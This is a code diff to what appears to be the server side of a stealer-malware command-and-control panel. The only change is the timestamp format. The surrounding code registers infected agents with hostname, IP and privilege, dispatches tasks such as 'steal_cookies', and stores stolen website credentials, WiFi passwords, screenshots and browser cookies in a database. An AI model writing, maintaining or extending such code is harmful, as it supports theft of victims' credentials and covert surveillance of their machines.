@@ -46,7 +46,7 @@ def init_api_routes(app, socketio):
                     data['task_type'], 
                     json.dumps(task_data),
                     'pending', 
-                    datetime.now().isoformat(), 
+                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
                     None))
             
             conn.commit()
@@ -108,7 +108,7 @@ def init_api_routes(app, socketio):
                       data.get('hostname', 'UNKNOWN'),
                       data.get('ip', '0.0.0.0'),
                       data.get('os', 'UNKNOWN'),
-                      datetime.now().isoformat(),
+                      datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ,
                       'online',
                       data.get('privilege', 'user'),
                       current_ws_status))
@@ -124,7 +124,7 @@ def init_api_routes(app, socketio):
                                   cred.get('url', ''),
                                   cred.get('username', ''),
                                   cred.get('password', ''),
-                                  datetime.now().isoformat()))
+                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                     except Exception as e:
                         app.logger.error(f"Error storing credential: {str(e)}")
                         continue
@@ -138,7 +138,7 @@ def init_api_routes(app, socketio):
                                   '',
                                   wifi.get('ssid', ''),
                                   wifi.get('password', ''),
-                                  datetime.now().isoformat()))
+                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                     except Exception as e:
                         app.logger.error(f"Error storing wifi: {str(e)}")
                         continue
@@ -157,7 +157,7 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                              (None, data['agent_id'],
                               image_data,
-                              datetime.now().isoformat()))
+                              datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
@@ -246,7 +246,7 @@ def init_api_routes(app, socketio):
             # Update task status
             c.execute('''UPDATE tasks SET status='completed', completed_at=?
                         WHERE id=?''', 
-                    (datetime.now().isoformat(), data['task_id']))
+                    (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
             
             # Handle different task types
             if data['task_type'] == 'steal_cookies' and 'result' in data and 'results' in data['result']:
@@ -290,7 +290,7 @@ def init_api_routes(app, socketio):
                                 'cookies',
                                 sqlite3.Binary(cookie_data),
                                 json.dumps(result.get('system_info', {})),
-                                datetime.now().isoformat()))
+                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                         
                         app.logger.info(f"Successfully stored {result['browser']} cookies")
                         
@@ -331,7 +331,7 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'], 
                             image_data,
-                            datetime.now().isoformat()))
+                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
@@ -346,7 +346,7 @@ def init_api_routes(app, socketio):
                                 cred.get('url', ''),
                                 cred.get('username', ''),
                                 cred.get('password', ''),
-                                datetime.now().isoformat()))
+                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                     except Exception as e:
                         app.logger.error(f"Error storing credential: {str(e)}")
                         pass
